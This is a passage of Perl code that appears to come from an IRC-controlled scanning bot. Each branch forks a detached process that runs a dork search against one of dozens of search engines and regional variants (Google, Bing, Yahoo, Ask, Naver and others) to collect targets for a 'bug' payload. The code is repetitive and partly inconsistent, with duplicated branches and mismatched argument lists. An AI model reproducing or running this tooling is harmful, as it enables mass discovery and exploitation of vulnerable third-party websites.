	if ($engine =~ /jackie/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKIE",$type,$nick); } exit; } }
	if ($engine =~ /jacktv/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKTV",$type,$nick); } exit; } }
	if ($engine =~ /jackpe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKPE",$type,$nick); } exit; } }
	if ($engine =~ /jackpt/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKPT",$type,$nick); } exit; } }
	if ($engine =~ /jackam/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKAM",$type,$nick); } exit; } }
	if ($engine =~ /jacksk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKSK",$type,$nick); } exit; } }
	if ($engine =~ /jackno/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKNO",$type,$nick); } exit; } }
	if ($engine =~ /jacksg/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKSG",$type,$nick); } exit; } }
	if ($engine =~ /jackse/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKSE",$type,$nick); } exit; } }
	if ($engine =~ /jackch/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKCH",$type,$nick); } exit; } }
	if ($engine =~ /jacktr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKTR",$type,$nick); } exit; } }			
	if ($engine =~ /jackam/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKAM",$type,$nick); } exit; } }
	if ($engine =~ /jacksk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKSK",$type,$nick); } exit; } }
	if ($engine =~ /jackno/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKNO",$type,$nick); } exit; } }
	if ($engine =~ /jacksg/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKSG",$type,$nick); } exit; } }
	if ($engine =~ /jackse/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKSE",$type,$nick); } exit; } }
	if ($engine =~ /jackch/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKCH",$type,$nick); } exit; } }
	if ($engine =~ /jackgo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKGO",$type,$nick); } exit; } }
	if ($engine =~ /google/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Google",$type,$nick); } exit; } }
	if ($engine =~ /googleCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeCA",$type,$nick); } exit; } }
	if ($engine =~ /googleDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeDE",$type,$nick); } exit; } }
	if ($engine =~ /googleUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeUK",$type,$nick); } exit; } }
	if ($engine =~ /googleFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeFR",$type,$nick); } exit; } }
	if ($engine =~ /googleES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeES",$type,$nick); } exit; } }
	if ($engine =~ /googleIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeIT",$type,$nick); } exit; } }
	if ($engine =~ /googleNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeNL",$type,$nick); } exit; } }
	if ($engine =~ /googleBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeBE",$type,$nick); } exit; } }
	if ($engine =~ /googleCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeCH",$type,$nick); } exit; } }
	if ($engine =~ /googleSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeSE",$type,$nick); } exit; } }
	if ($engine =~ /googleDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeDK",$type,$nick); } exit; } }
	if ($engine =~ /googleNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeNO",$type,$nick); } exit; } }
	if ($engine =~ /googleNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeNZ",$type,$nick); } exit; } }
	if ($engine =~ /googleIE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeIE",$type,$nick); } exit; } }
	if ($engine =~ /googleBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeBR",$type,$nick); } exit; } }
	if ($engine =~ /googleAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeAR",$type,$nick); } exit; } }
	if ($engine =~ /googleCO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeCO",$type,$nick); } exit; } }
	if ($engine =~ /googleCU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeCU",$type,$nick); } exit; } }
	if ($engine =~ /googleCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeCL",$type,$nick); } exit; } }
	if ($engine =~ /googleMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeMX",$type,$nick); } exit; } }
	if ($engine =~ /googleAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeAU",$type,$nick); } exit; } }
	if ($engine =~ /googleRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeRU",$type,$nick); } exit; } }
	if ($engine =~ /googleAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeAT",$type,$nick); } exit; } }
	if ($engine =~ /googlePL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLePL",$type,$nick); } exit; } }
	if ($engine =~ /googleIL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeIL",$type,$nick); } exit; } }
	if ($engine =~ /googleTR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeTR",$type,$nick); } exit; } }
	if ($engine =~ /googleUA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeUA",$type,$nick); } exit; } }
	if ($engine =~ /googleGR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeGR",$type,$nick); } exit; } }
	if ($engine =~ /googleJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeJP",$type,$nick); } exit; } }
	if ($engine =~ /googleCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeCN",$type,$nick); } exit; } }
	if ($engine =~ /googleMY/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeMY",$type,$nick); } exit; } }
	if ($engine =~ /googleTH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeTH",$type,$nick); } exit; } }
	if ($engine =~ /googleIN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeIN",$type,$nick); } exit; } }
	if ($engine =~ /googleKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeKR",$type,$nick); } exit; } }
	if ($engine =~ /googleRO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeRO",$type,$nick); } exit; } }
	if ($engine =~ /googleTW/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeTW",$type,$nick); } exit; } }
	if ($engine =~ /googleZA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLeZA",$type,$nick); } exit; } }
	if ($engine =~ /googlePT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"GooGLePT",$type,$nick); } exit; } }
	if ($engine =~ /bing/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Bing",$type,$nick); } exit; } }
	if ($engine =~ /bingDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingDE",$type,$nick); } exit; } }
	if ($engine =~ /bingUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingUK",$type,$nick); } exit; } }
	if ($engine =~ /bingCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingCA",$type,$nick); } exit; } }
	if ($engine =~ /bingBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingBR",$type,$nick); } exit; } }
	if ($engine =~ /bingFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingFR",$type,$nick); } exit; } }
	if ($engine =~ /bingES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingES",$type,$nick); } exit; } }
	if ($engine =~ /bingIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingIT",$type); } exit; } }
	if ($engine =~ /bingBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingBE",$type); } exit; } }
	if ($engine =~ /bingNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingNL",$type); } exit; } }
	if ($engine =~ /bingPT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingPT",$type); } exit; } }
	if ($engine =~ /bingNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingNO",$type); } exit; } }
	if ($engine =~ /bingDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingDK",$type); } exit; } }
	if ($engine =~ /bingSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingSE",$type); } exit; } }
	if ($engine =~ /bingCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingCH",$type); } exit; } }
	if ($engine =~ /bingNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingNZ",$type); } exit; } }
	if ($engine =~ /bingRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingRU",$type); } exit; } }
	if ($engine =~ /bingJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingJP",$type); } exit; } }
	if ($engine =~ /bingCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingCN",$type); } exit; } }
	if ($engine =~ /bingKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingKR",$type); } exit; } }
	if ($engine =~ /bingMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingMX",$type); } exit; } }
	if ($engine =~ /bingAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingAR",$type); } exit; } }
	if ($engine =~ /bingCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingCL",$type); } exit; } }
	if ($engine =~ /bingAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BingAU",$type); } exit; } }
	if ($engine =~ /biglobe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"BigLobe",$type,$nick); } exit; } }
	if ($engine =~ /walla/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"WaLLa",$type,$nick); } exit; } }
	if ($engine =~ /yahoo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YaHoo",$type,$nick); } exit; } }
	if ($engine =~ /yahooCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoCA",$type,$nick); } exit; } }
	if ($engine =~ /yahooUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoUK",$type,$nick); } exit; } }
	if ($engine =~ /yahooDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoDE",$type,$nick); } exit; } }
	if ($engine =~ /yahooFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoFR",$type,$nick); } exit; } }
	if ($engine =~ /yahooES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoES",$type,$nick); } exit; } }
	if ($engine =~ /yahooIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoIT",$type,$nick); } exit; } }
	if ($engine =~ /yahooHK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoHK",$type,$nick); } exit; } }
	if ($engine =~ /yahooID/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoID",$type,$nick); } exit; } }
	if ($engine =~ /yahooIN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoIN",$type,$nick); } exit; } }
	if ($engine =~ /yahooAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoAU",$type,$nick); } exit; } }
	if ($engine =~ /yahooMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoMX",$type,$nick); } exit; } }
	if ($engine =~ /yahooTW/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoTW",$type,$nick); } exit; } }
	if ($engine =~ /yahooBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoBR",$type,$nick); } exit; } }
	if ($engine =~ /yahooAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoAR",$type,$nick); } exit; } }
	if ($engine =~ /yahooNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoNL",$type,$nick); } exit; } }
	if ($engine =~ /yahooDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoDK",$type,$nick); } exit; } }
	if ($engine =~ /yahooPH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoPH",$type,$nick); } exit; } }
	if ($engine =~ /yahooCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoCL",$type,$nick); } exit; } }
	if ($engine =~ /yahooRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoRU",$type,$nick); } exit; } }
	if ($engine =~ /yahooCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoCH",$type,$nick); } exit; } }
	if ($engine =~ /yahooCO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoCO",$type,$nick); } exit; } }
	if ($engine =~ /yahooFI/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoFI",$type,$nick); } exit; } }
	if ($engine =~ /yahooRO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoRO",$type,$nick); } exit; } }
	if ($engine =~ /yahooVE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoVE",$type,$nick); } exit; } }
	if ($engine =~ /yahooAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoAT",$type,$nick); } exit; } }
	if ($engine =~ /yahooPL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoPL",$type,$nick); } exit; } }
	if ($engine =~ /yahooKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoKR",$type,$nick); } exit; } }
	if ($engine =~ /yahooNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoNZ",$type,$nick); } exit; } }
	if ($engine =~ /yahooGR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoGR",$type,$nick); } exit; } }
	if ($engine =~ /yahooPE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"YahOoPE",$type,$nick); } exit; } }
	if ($engine =~ /ask/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsK",$type); } exit; } }
	if ($engine =~ /askCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKCA",$type,$nick); } exit; } }
	if ($engine =~ /askDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKDE",$type,$nick); } exit; } }
	if ($engine =~ /askIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKIT",$type,$nick); } exit; } }
	if ($engine =~ /askFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKFR",$type,$nick); } exit; } }
	if ($engine =~ /askES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKES",$type,$nick); } exit; } }
	if ($engine =~ /askRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKRU",$type,$nick); } exit; } }
	if ($engine =~ /askNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKNL",$type,$nick); } exit; } }
	if ($engine =~ /askUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKUK",$type,$nick); } exit; } }
	if ($engine =~ /askBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKBR",$type,$nick); } exit; } }
	if ($engine =~ /askPL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKPL",$type,$nick); } exit; } }
	if ($engine =~ /askAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKAU",$type,$nick); } exit; } }
	if ($engine =~ /askAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKAT",$type,$nick); } exit; } }
	if ($engine =~ /askJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKJP",$type,$nick); } exit; } }
	if ($engine =~ /askSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKSE",$type,$nick); } exit; } }
	if ($engine =~ /askMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKMX",$type); } exit; } }
	if ($engine =~ /askNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKNO",$type); } exit; } }
	if ($engine =~ /askDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AsKDK",$type); } exit; } }
	if ($engine =~ /uol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"UoL",$type,$nick); } exit; } }
	if ($engine =~ /onet/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"OnEt",$type); } exit; } }
	if ($engine =~ /bing/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Bing",$type,$nick); } exit; } }
	if ($engine =~ /black/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Black",$type,$nick); } exit; } }
	if ($engine =~ /amidalla/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"aMidaLLa",$type,$nick); } exit; } }
	if ($engine =~ /cada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"CaDa",$type,$nick); } exit; } }
	if ($engine =~ /dogpile/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"DogPile",$type,$nick); } exit; } }	
	if ($engine =~ /google2/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Google2",$type,$nick); } exit; } }
	if ($engine =~ /ananzi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"AnAnZi",$type,$nick); } exit; } }	
	if ($engine =~ /izito/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"IzItO",$type,$nick); } exit; } }
	if ($engine =~ /volunia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"VolUnIa",$type,$nick); } exit; } }
	if ($engine =~ /walla/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Walla",$type,$nick); } exit; } }
	if ($engine =~ /yahoo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Yahoo",$type,$nick); } exit; } }
	if ($engine =~ /onet/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Onet",$type,$nick); } exit; } }
	if ($engine =~ /clusty/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Clusty",$type,$nick); } exit; } }
	if ($engine =~ /sapo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Sapo",$type,$nick); } exit; } }
	if ($engine =~ /aol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Aol",$type,$nick); } exit; } }
	if ($engine =~ /lycos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Lycos",$type,$nick); } exit; } }
	if ($engine =~ /hotbot/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Hotbot",$type,$nick); } exit; } }
	if ($engine =~ /biglobe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Biglobe",$type,$nick); } exit; } }
	if ($engine =~ /kvasir/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Kvasir",$type,$nick); } exit; } }
	if ($engine =~ /rediff/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Rediff",$type,$nick); } exit; } }
	if ($engine =~ /sizuka/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Sizuka",$type,$nick); } exit; } }
	if ($engine =~ /naver/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"NaveR",$type,$nick); } exit; } }
	if ($engine =~ /interia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Interia",$type,$nick); } exit; } }
	if ($engine =~ /snz/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Snz",$type,$nick); } exit; } }
